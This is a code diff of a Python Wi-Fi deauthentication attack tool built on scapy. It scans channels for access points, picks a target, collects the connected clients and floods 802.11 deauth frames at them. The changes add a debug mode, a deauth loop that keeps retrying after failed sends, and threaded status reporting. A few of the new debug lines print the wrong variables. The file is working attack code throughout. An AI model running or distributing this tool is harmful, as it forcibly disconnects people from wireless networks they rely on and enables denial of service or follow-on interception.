@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 
-import sys
+import sys  # leave it
 import signal
 import logging
 import argparse
+import threading  # leave it
 
 from scapy.layers.dot11 import RadioTap, Dot11Elt, Dot11Beacon, Dot11ProbeResp, Dot11ReassoResp, Dot11AssoResp, \
     Dot11QoS, Dot11Deauth, Dot11
@@ -35,15 +36,16 @@ conf.verb = 0
 
 class Interceptor:
     _ABORT = False
+    _PRINT_STATS_INTV = 1
+    _DEAUTH_INTV = 0.100  # 100[ms]
+    _CH_SNIFF_TO = 2
+    _SSID_STR_PAD = 42  # total len 80
 
     def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager,
-                 ssid_name, bssid_addr, custom_client_macs, custom_channels, autostart):
+                 ssid_name, bssid_addr, custom_client_macs, custom_channels, autostart, debug_mode):
         self.interface = net_iface
-        self._channel_sniff_timeout = 2
-        self._scan_intv = 0.1
-        self._deauth_intv = 0.1
-        self._printf_res_intv = 1
-        self._ssid_str_pad = 42  # total len 80
+
+        self._max_consecutive_failed_send_lim = 5 / Interceptor._DEAUTH_INTV  # fails to send for 5 consecutive seconds
 
         self._current_channel_num = None
         self._current_channel_aps = set()
@@ -51,6 +53,7 @@ class Interceptor:
         self.attack_loop_count = 0
 
         self.target_ssid: Union[SSID, None] = None
+        self._debug_mode = debug_mode
 
         if not skip_monitor_mode_setup:
             print_info(f"Setting up monitor mode...")
@@ -67,14 +70,18 @@ class Interceptor:
                 print_error(f"Failed to kill NetworkManager...")
 
         self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}
+        self.log_debug(f"Supported channels: {[c for c in self._channel_range.keys()]}")
         self._all_ssids: Dict[BandType, Dict[str, SSID]] = {band: dict() for band in BandType}
-
         self._custom_ssid_name: Union[str, None] = self.parse_custom_ssid_name(ssid_name)
+        self.log_debug(f"Selected custom ssid name: {self._custom_ssid_name}")
         self._custom_bssid_addr: Union[str, None] = self.parse_custom_bssid_addr(bssid_addr)
+        self.log_debug(f"Selected custom bssid addr: {self._custom_ssid_name}")
         self._custom_target_client_mac: Union[List[str], None] = self.parse_custom_client_mac(custom_client_macs)
+        self.log_debug(f"Selected arget client mac addrs: {self._custom_target_client_mac}")
         self._custom_target_ap_channels: List[int] = self.parse_custom_channels(custom_channels)
-        self._custom_target_ap_last_ch = 0  # to avoid overlapping
+        self.log_debug(f"Selected target client channels: {self._custom_target_client_mac}")
 
+        self._custom_target_ap_last_ch = 0  # to avoid overlapping
         self._midrun_output_buffer: List[str] = list()
         self._midrun_output_lck = threading.RLock()
 
@@ -193,7 +200,6 @@ class Interceptor:
         print_info(f"Starting AP scan, please wait... ({len(channels_to_scan)} channels total)")
         if self._custom_ssid_name_is_set():
             print_info(f"Scanning for target SSID -> {self._custom_ssid_name}")
-
         try:
             for idx, ch_num in enumerate(channels_to_scan):
                 if self._custom_ssid_name_is_set() and self._found_custom_ssid_name() \
@@ -203,7 +209,7 @@ class Interceptor:
                 self._set_channel(ch_num)
                 print_info(f"Scanning channel {self._current_channel_num} (left -> "
                            f"{len(channels_to_scan) - (idx + 1)})", end="\r")
-                sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=self._channel_sniff_timeout,
+                sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=Interceptor._CH_SNIFF_TO,
                       stop_filter=lambda p: Interceptor._ABORT is True)
         finally:
             printf("")
@@ -242,9 +248,7 @@ class Interceptor:
                 pref = f"[{BOLD}{YELLOW}{str(ctr).rjust(3, ' ')}{RESET}] "
                 printf(f"{pref}{self._generate_ssid_str(ssid_obj.name, ssid_obj.channel, ssid_obj.mac_addr, preflen)}")
         if not target_map:
-            print_error("Not APs were found, quitting...")
-            Interceptor._ABORT = True
-            exit(0)
+            Interceptor.abort_run("Not APs were found, quitting...")
 
         printf(DELIM)
 
@@ -269,7 +273,7 @@ class Interceptor:
         return target_map[chosen]
 
     def _generate_ssid_str(self, ssid, ch, mcaddr, preflen):
-        return f"{ssid.ljust(self._ssid_str_pad - preflen, ' ')}{str(ch).ljust(3, ' ').ljust(self._ssid_str_pad // 2, ' ')}{mcaddr}"
+        return f"{ssid.ljust(Interceptor._SSID_STR_PAD - preflen, ' ')}{str(ch).ljust(3, ' ').ljust(Interceptor._SSID_STR_PAD // 2, ' ')}{mcaddr}"
 
     def _clients_sniff_cb(self, pkt):
         try:
@@ -314,18 +318,23 @@ class Interceptor:
         try:
             print_info(f"Starting de-auth loop...")
 
+            failed_attempts_ctr = 0
             ap_mac = self.target_ssid.mac_addr
             while not Interceptor._ABORT:
-                self.attack_loop_count += 1
-                for client_mac in self._get_target_clients():
-                    self._send_deauth_client(ap_mac, client_mac)
-                if not self._custom_target_client_mac:
-                    self._send_deauth_broadcast(ap_mac)
-            sleep(self._deauth_intv)
+                try:
+                    self.attack_loop_count += 1
+                    for client_mac in self._get_target_clients():
+                        self._send_deauth_client(ap_mac, client_mac)
+                    if not self._custom_target_client_mac:
+                        self._send_deauth_broadcast(ap_mac)
+                    failed_attempts_ctr = 0  # reset counter
+                except Exception as exc:
+                    failed_attempts_ctr += 1
+                    if failed_attempts_ctr >= self._max_consecutive_failed_send_lim:
+                        raise exc
+                    sleep(Interceptor._DEAUTH_INTV)  # if exception - sleep to throttle down
         except Exception as exc:
-            print_error(f"Exception in deauth-loop -> {traceback.format_exc()}")
-            Interceptor._ABORT = True
-            exit(0)
+            Interceptor.abort_run(f"Exception '{exc}' in deauth-loop -> {traceback.format_exc()}")
 
     def _send_deauth_client(self, ap_mac: str, client_mac: str):
         sendp(RadioTap() /
@@ -351,30 +360,48 @@ class Interceptor:
         self._set_channel(ssid_ch)
 
         printf(f"{DELIM}\n")
-        for action in [self._run_deauther, self._listen_for_clients]:
-            t = Thread(target=action, args=tuple(), daemon=True)
-            t.start()
 
+        threads = list()
+        for action in [self._run_deauther, self._listen_for_clients, self.report_status]:
+            t = Thread(target=action, args=tuple())
+            t.start()
+            threads.append(t)
+
+        for t in threads:
+            t.join()
+
+    def report_status(self):
         start = get_time()
         printf(f"{DELIM}\n")
 
         while not Interceptor._ABORT:
             buffer_sz = self._print_midrun_output()
             print_info(f"Target SSID{self.target_ssid.name.rjust(80 - 15, ' ')}")
-            print_info(f"Channel{str(ssid_ch).rjust(80 - 11, ' ')}")
+            print_info(f"Channel{str(self._current_channel_num).rjust(80 - 11, ' ')}")
             print_info(f"MAC addr{self.target_ssid.mac_addr.rjust(80 - 12, ' ')}")
             print_info(f"Net interface{self.interface.rjust(80 - 17, ' ')}")
             print_info(f"Target clients{BOLD}{str(len(self._get_target_clients())).rjust(80 - 18, ' ')}{RESET}")
             print_info(f"Elapsed sec {BOLD}{str(get_time() - start).rjust(80 - 16, ' ')}{RESET}")
-            sleep(self._printf_res_intv)
+            sleep(Interceptor._PRINT_STATS_INTV)
+            if Interceptor._ABORT:  # might change while sleeping
+                break
             clear_line(7 + buffer_sz)
 
+    def log_debug(self, msg: str):
+        if self._debug_mode:
+            print_debug(msg)
+
     @staticmethod
-    def user_abort(*args):
-        if not Interceptor._ABORT:
+    def user_abort(*_):
+        Interceptor.abort_run(f"User asked to stop, quitting...")
+
+    @staticmethod
+    def abort_run(msg: str):
+        if not Interceptor._ABORT:  # thread-safe due to GIL
             Interceptor._ABORT = True
+            sleep(Interceptor._PRINT_STATS_INTV * 1.1)  # let prints finish
             printf(f"{DELIM}")
-            print_error(f"User asked to stop, quitting...")
+            print_error(msg)
             exit(0)
 
 
@@ -392,7 +419,6 @@ def main():
 
     if "linux" not in sys.platform:
         raise Exception(f"Unsupported operating system {sys.platform}, only linux is supported...")
-    
 
     parser = argparse.ArgumentParser(description='A simple program to perform a deauth attack')
     parser.add_argument('-i', '--iface', help='a network interface with monitor mode enabled (i.e -> "eth0")',
@@ -412,6 +438,8 @@ def main():
                         metavar="ch1,ch2", action='store', default=None, dest="custom_channels", required=False)
     parser.add_argument('-a', '--autostart', help='autostart the de-auth loop (if the scan result contains a single access point)',
                         action='store_true', default=False, dest="autostart", required=False)
+    parser.add_argument('-d', '--debug', help='enable debug prints',
+                        action='store_true', default=False, dest="debug_mode", required=False)
     pargs = parser.parse_args()
 
     invalidate_print()  # after arg parsing
@@ -422,7 +450,8 @@ def main():
                            bssid_addr=pargs.custom_bssid,
                            custom_client_macs=pargs.custom_client_macs,
                            custom_channels=pargs.custom_channels,
-                           autostart=pargs.autostart)
+                           autostart=pargs.autostart,
+                           debug_mode=pargs.debug_mode)
     attacker.run()
 
 
